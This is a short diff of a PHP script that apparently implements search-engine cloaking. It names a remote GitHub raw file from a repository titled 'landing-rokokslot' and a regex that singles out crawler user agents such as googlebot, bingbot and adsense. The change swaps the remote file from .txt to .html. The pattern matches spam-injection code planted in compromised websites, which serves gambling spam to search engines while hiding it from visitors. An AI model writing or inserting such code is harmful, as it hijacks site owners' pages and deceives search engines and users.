@@ -2,7 +2,7 @@
 ob_start();
 header("Vary: U-Agent");
 
-$src = "https://raw.githubusercontent.com/waklabu979/landing-rokokslot/refs/heads/main/revisiidea.txt";
+$src = "https://raw.githubusercontent.com/waklabu979/landing-rokokslot/refs/heads/main/revisiidea.html";
 $match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
 
